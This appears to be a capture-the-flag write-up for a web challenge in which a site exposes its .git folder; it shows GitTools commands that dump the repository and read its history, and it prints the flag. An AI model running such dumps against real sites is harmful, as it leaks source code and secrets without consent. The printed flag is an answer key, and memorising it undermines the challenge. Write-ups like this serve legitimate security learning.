# [Web] Git Good

> Points: 70
> Solves: 567

## Description

Did you know that angstrom has a git repo for all the challenges? I noticed that clam committed [a very work in progress challenge](https://gitgood.2020.chall.actf.co) so I thought it was worth sharing.

> Hint: Static file serving is a very dangerous thing when in the wrong directory.

## Solution

As the challenge title mentions, it might be the risk of `.git` folder leaked.

By using [GitTools](https://github.com/internetwache/GitTools), we can recover the original git repository.

```sh
$ ./Dumper/gitdumper.sh https://gitgood.2020.chall.actf.co/.git/ tmp
$ cd tmp
$ git log -p
```

Then we can see the flag which has been replaced.

Flag `actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}`
